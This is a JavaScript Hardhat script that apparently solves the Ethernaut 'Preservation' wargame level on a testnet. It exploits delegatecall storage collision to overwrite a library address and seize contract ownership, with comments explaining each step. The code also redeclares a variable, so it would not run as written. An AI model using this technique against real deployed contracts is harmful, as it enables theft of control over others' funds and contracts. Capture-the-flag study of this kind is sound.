import { ethers } from "hardhat";
import assert from 'node:assert/strict';

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // Preservation address
    let address_a = "0x0f3741093bC2fC2818A45eBD365f5e13bb200970";
    // PreservationHack address
    let address_b = "0x46e98b9Ad5F21cf0Ba0EC1C5d7A43E41bcbfc23D"

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Preservation", address_a, signer);
    let contract_b = await ethers.getContractAt("PreservationHack", address_b, signer);

    // we set "timestamp" as PreservationHack  address, and the function is using delegatecall, which calls the library contract in context of calling contract, so we are setting address of timezone!Library to our PreservationHack address
    let tx = await contract_a.setFirstTime(address_b);
    await tx.wait();
    let add = await contract_a.timeZone1Library();
    assert(add == address_b);
    // we call the same function again, but this time we have taken over the library instance and we can implement out custom function. Parameter does not matter.
    let tx = await contract_a.setFirstTime(player, {maxPriorityFeePerGas: 2e10, maxFeePerGas: 2e10,gasLimit: 50000});
    await tx.wait();

    // check that we have successfully took control of contract
    console.log(await contract_a.owner());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
